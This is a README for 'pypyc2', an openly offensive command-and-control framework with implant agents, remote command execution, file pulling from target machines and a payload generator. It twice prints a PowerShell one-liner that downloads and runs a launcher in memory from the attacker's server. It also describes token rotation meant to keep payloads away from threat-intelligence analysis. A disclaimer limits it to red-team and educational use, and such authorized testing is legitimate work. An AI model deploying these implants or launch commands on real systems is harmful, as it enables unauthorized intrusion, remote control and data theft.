# pypyc2

A modern Command and Control (C2) Framework with a web-based GUI dashboard, authentication system, and automated payload generation.

## Architecture

```
pypyc2/
├── Agent/          # Agent (implant) code - runs on target machines
├── Server/         # FastAPI backend server
└── Frontend/       # Next.js web dashboard
```

## Features

### Core Features
- **Modern Web Dashboard** - Next.js 15-based responsive UI with React 19
- **Authentication System** - Secure login with session management
- **Real-time Agent Management** - Track online/offline agents with live status
- **Interactive Terminal** - Execute commands on remote agents
- **File Transfer** - Upload/download files between server and agents
- **Command History** - View all executed commands and results
- **Agent Monitoring** - Last-seen tracking, status indicators, timezone-aware timestamps

### Advanced Features
- **Automated Payload Generator** - Generate agent payloads with rotating tokens
- **PowerShell Launcher** - Auto-installs Python and deploys agents
- **Directory Browser** - Interactive file tree for remote systems
- **Dynamic Sleep Time** - Adjust agent polling intervals (1-60 seconds)
- **Network Topology View** - Visualize agent connections
- **Agent Termination** - Graceful shutdown of remote agents

## Quick Start

### Prerequisites
- Python 3.x
- Node.js and npm

### 1. Start the FastAPI Server

```bash
cd Server
pip install -r requirements.txt
python main.py
```

Server will run on `http://localhost:8000`

### 2. Start the Next.js Frontend

```bash
cd Frontend
npm install
npm run dev
```

Frontend will run on `http://localhost:3000`

### 3. Login to Dashboard

1. Navigate to `http://localhost:3000`
2. Login with default credentials:
   - **Username:** `admin`
   - **Password:** `pypyc2admin`
3. **IMPORTANT:** Change the default password after first login

### 4. Deploy an Agent

**Option A: Manual Deployment**

```bash
cd Agent
pip install -r requirements.txt
python main.py <SERVER_IP>
```

Example: `python main.py 192.168.1.100`

**Option B: Automated Deployment (Recommended)**

1. Go to the **Payloads** page in the dashboard
2. Copy the current payload token (rotates every 5 minutes)
3. Run the PowerShell launcher on target machine:
   ```powershell
   # Download and execute launcher
   IEX (New-Object Net.WebClient).DownloadString('http://SERVER_IP:8000/payload/launcher.ps1?id=TOKEN')
   ```
4. The launcher will:
   - Auto-install Python if not present
   - Download the agent code
   - Execute in-memory (no disk writes)
   - Connect back to the server

**Option C: All-in-One Agent**

Use the self-contained agent with no external dependencies:

```bash
cd Agent
python allinone.py <SERVER_IP>
```

## Usage

### Authentication

**Login:**
- Navigate to `http://localhost:3000/login`
- Enter credentials
- Session valid for 8 hours

**Logout:**
- Click logout in the dashboard
- Sessions are invalidated server-side

**Changing Password:**
Edit `Server/core/security.py` and regenerate the bcrypt hash for a new password.

### Web Dashboard

Access the dashboard at `http://localhost:3000` (requires authentication)

**Pages:**
- **Dashboard** - Overview of all agents with stats and network topology
- **Agents** - Detailed agent list with filtering and status
- **Terminal** - Interactive command execution
- **Files** - File management and transfer
- **Payloads** - Generate deployment payloads with rotating tokens

### Terminal Commands

Select an agent from the sidebar and execute commands:

```bash
# System information
whoami                  # Get current user
hostname                # Get hostname
ipconfig                # Network configuration (Windows)
ifconfig                # Network configuration (Linux/Mac)

# PowerShell commands (Windows)
Get-Process             # List processes
Get-Service             # List services

# Directory navigation
cd C:\Users             # Change directory (persistent)
pwd                     # Print working directory

# File operations
dir                     # List directory
cat file.txt            # Read file contents
```

### Special Commands

**Browse Directory:**
1. Go to Files page
2. Select agent
3. Click "Browse Files"
4. Navigate the interactive file tree

**Adjust Agent Sleep Time:**
```bash
# In terminal, change polling interval (1-60 seconds)
# This is handled through the dashboard UI
```

**Terminate Agent:**
1. Select agent
2. Click "Delete" in agent list
3. Online agents receive terminate command before removal

### File Operations

**Upload from Agent to Server:**
1. Go to Files page
2. Select agent
3. Click "Request from Agent"
4. Enter the file path on the agent (e.g., `C:\Users\Public\file.txt`)
5. File will be uploaded to `Server/uploads/agent_<id>/`

**Download from Server to Agent:**
1. Upload a file to the server first (or stage it)
2. Select the file
3. Click "Send to Agent"
4. Enter the destination path on the agent

### Payload Generation

**Generate Deployment Payload:**

1. Navigate to **Payloads** page
2. View the current payload token (auto-rotates every 5 minutes)
3. Use one of the deployment methods:

   **PowerShell One-Liner:**
   ```powershell
   IEX (New-Object Net.WebClient).DownloadString('http://SERVER_IP:8000/payload/launcher.ps1?id=TOKEN')
   ```

   **Direct Download:**
   - Download `launcher.ps1` from the Payloads page
   - Execute on target: `.\launcher.ps1`

**How Token Rotation Works:**
- Tokens expire after 5 minutes
- Prevents threat intelligence from analyzing payloads
- New agents can only join during token validity window
- Old tokens are automatically rejected

## API Endpoints

### Authentication (Public)
- `POST /auth/login` - Login with username/password
  ```json
  {"username": "admin", "password": "pypyc2admin"}
  ```
- `POST /auth/logout` - Logout and invalidate session
- `GET /auth/verify` - Verify current session token

### Payload Generation (Requires Auth)
- `GET /api/payload-token` - Get current payload token
- `GET /payload/launcher.ps1?id=<token>` - Download PowerShell launcher
- `GET /payload/allinone.py` - Download all-in-one agent

### Agent Management (Requires Auth)
- `GET /agents` - List all agents
- `GET /agent/{agent_id}` - Get agent details
- `DELETE /agent/{agent_id}` - Delete agent (sends terminate if online)

### Command Execution (Requires Auth)
- `POST /command/{agent_id}/exec?command=<cmd>` - Execute shell command
- `POST /command/{agent_id}/list_directory?path=<path>` - Browse directory tree
- `POST /command/{agent_id}/set_sleep_time?sleep_time=<seconds>` - Adjust polling interval (1-60s)
- `POST /command/{agent_id}/terminate` - Gracefully terminate agent
- `POST /command/{agent_id}/upload?source_path=<path>` - Request file from agent
- `POST /command/{agent_id}/download?filename=<file>&save_as=<path>` - Send file to agent
- `GET /command/{agent_id}/{command_id}` - Get command result

### File Management (Requires Auth)
- `GET /files/{agent_id}` - List agent's uploaded files
- `POST /upload_for_agent/{agent_id}` - Upload file for agent
- `GET /files/agent_{agent_id}/{filename}` - Download file
- `GET /dashboard/files/{agent_id}/{filename}` - Protected file download

### Agent Communication (Public - for agents)
- `POST /join` - Agent registration
- `GET /agent/get_commands/{agent_id}` - Agent polls for commands
- `POST /agent/set_command_result` - Agent submits command results
- `POST /agent/upload_file` - Agent uploads requested file

## Development

### Project Structure

```
Server/
  ├── main.py              # FastAPI application entry point
  ├── config.py            # Configuration and global state
  ├── dependencies.py      # Authentication dependencies
  ├── models.py            # Pydantic models
  ├── core/                # Core functionality
  │   ├── agent.py         # Agent class
  │   ├── security.py      # Authentication & session management
  │   └── token_manager.py # Payload token rotation
  ├── routers/             # API routes by feature
  │   ├── auth.py          # Login/logout routes
  │   ├── agents.py        # Agent management
  │   ├── commands.py      # Command execution
  │   ├── agent_comms.py   # Agent communication
  │   ├── files.py         # File transfers
  │   └── payloads.py      # Payload generation
  ├── files/               # Server files
  │   └── launcher.ps1     # PowerShell launcher script
  └── uploads/             # Uploaded files storage

Frontend/
  ├── src/
  │   ├── app/
  │   │   ├── (dashboard)/     # Protected dashboard routes
  │   │   │   ├── page.tsx     # Dashboard overview
  │   │   │   ├── agents/      # Agent management
  │   │   │   ├── terminal/    # Terminal interface
  │   │   │   ├── files/       # File management
  │   │   │   └── payloads/    # Payload generator
  │   │   ├── login/           # Login page
  │   │   └── layout.tsx
  │   ├── components/          # React components
  │   │   ├── NetworkTopology.tsx  # Network visualization
  │   │   ├── AgentNode.tsx        # Agent node component
  │   │   ├── FileTreeModal.tsx    # Directory browser
  │   │   └── Sidebar.tsx
  │   ├── contexts/            # React contexts
  │   │   └── AuthContext.tsx  # Authentication context
  │   ├── lib/                 # API client and utilities
  │   └── types/               # TypeScript types
  └── package.json

Agent/
  ├── main.py          # Standard agent (requires requests library)
  ├── allinone.py      # All-in-one agent (self-contained)
  ├── functions.py     # Helper functions
  └── requirements.txt
```

### Technologies

**Backend:**
- FastAPI - Modern Python web framework
- Uvicorn - ASGI server
- Pydantic - Data validation
- passlib[bcrypt] - Password hashing
- python-multipart - File upload support

**Frontend:**
- Next.js 15 - React framework
- React 19 - UI library
- TypeScript - Type safety
- Tailwind CSS 4 - Styling
- Lucide React - Icons
- react-virtuoso - Efficient list rendering

**Agent:**
- Python 3.x
- Requests - HTTP client (only for standard agent)

## Configuration

### Server Configuration

Edit `Server/config.py`:
```python
MAX_FILE_SIZE = 100 * 1024 * 1024  # 100MB
UPLOAD_DIR = Path("uploads")
```

### Authentication Configuration

Edit `Server/core/security.py`:
```python
SESSION_TIMEOUT = timedelta(hours=8)  # Session expiry time

# Default credentials
DEFAULT_USERNAME = "admin"
DEFAULT_PASSWORD_HASH = bcrypt.hash("pypyc2admin")

# Change password by generating new hash:
# from passlib.hash import bcrypt
# new_hash = bcrypt.hash("your_new_password")
```

### Payload Token Configuration

Edit `Server/core/token_manager.py`:
```python
TOKEN_LIFETIME = 300  # 5 minutes (300 seconds)
```

### Frontend Configuration

Edit `Frontend/.env.local`:
```env
NEXT_PUBLIC_API_URL=http://localhost:8000
```

### Agent Configuration

Edit `Agent/main.py`:
```python
REQUEST_TIMEOUT = 30      # Command request timeout
UPLOAD_TIMEOUT = 120      # File upload timeout
DOWNLOAD_TIMEOUT = 120    # File download timeout
SLEEP_TIME = 3            # Default polling interval (adjustable via command)
```

## Security Notes

### Important Security Considerations

**Educational/Research Use Only**

This is a Command & Control framework designed for:
- Security research
- Red team exercises
- Educational purposes
- Authorized penetration testing
- CTF competitions

**Not for malicious use. Always obtain proper authorization.**

### Security Best Practices

1. **Change Default Password**
   - The default credentials (`admin`/`pypyc2admin`) must be changed immediately
   - Generate strong bcrypt hashes for production use

2. **Use HTTPS in Production**
   - Configure TLS/SSL for the FastAPI server
   - Use secure cookies for session management
   - Update frontend API URL to use HTTPS

3. **Payload Token Rotation**
   - Tokens expire after 5 minutes to prevent abuse
   - Adjust `TOKEN_LIFETIME` based on your deployment needs
   - Monitor token usage in logs

4. **Session Management**
   - Sessions expire after 8 hours of inactivity
   - Tokens are invalidated on logout
   - Consider shorter sessions for high-security environments

5. **Network Security**
   - Run on isolated networks for testing
   - Use firewall rules to restrict access
   - Monitor agent connections

6. **File Upload Security**
   - Maximum file size is 100MB by default
   - Files are stored in isolated directories per agent
   - Validate file paths to prevent directory traversal

7. **Agent Communication**
   - Agent endpoints (`/join`, `/agent/*`) are intentionally public
   - Dashboard endpoints require authentication
   - Consider implementing agent authentication tokens

### Known Limitations

- No built-in encryption for agent communication (use VPN/tunnels)
- Session tokens stored in-memory (cleared on server restart)
- File uploads not scanned for malware
- No rate limiting on authentication endpoints

## Troubleshooting

### Authentication Issues

**Problem:** Cannot login with default credentials

**Solution:**
1. Verify server is running (`python Server/main.py`)
2. Check `Server/core/security.py` for correct password hash
3. Clear browser cookies and try again
4. Check server logs for authentication errors

### Agent Not Connecting

**Problem:** Agent doesn't appear in dashboard

**Solution:**
1. Verify server IP is correct
2. Check firewall allows port 8000
3. Verify payload token is still valid (5-minute window)
4. Check server logs for connection attempts
5. Ensure agent has network connectivity to server

### File Upload Fails

**Problem:** File upload times out or fails

**Solution:**
1. Check file size is under 100MB limit
2. Increase timeout in `Agent/main.py`
3. Verify disk space on server
4. Check file path is accessible on agent

### Session Expires Too Quickly

**Problem:** Getting logged out frequently

**Solution:**
1. Increase `SESSION_TIMEOUT` in `Server/core/security.py`
2. Check system time is synchronized
3. Verify browser is not blocking cookies

## License

MIT License - Use responsibly and ethically.

## Contributing

Feel free to submit issues and pull requests!

## Disclaimer

This tool is provided for educational and authorized testing purposes only. Users are responsible for complying with applicable laws and regulations. Unauthorized access to computer systems is illegal.
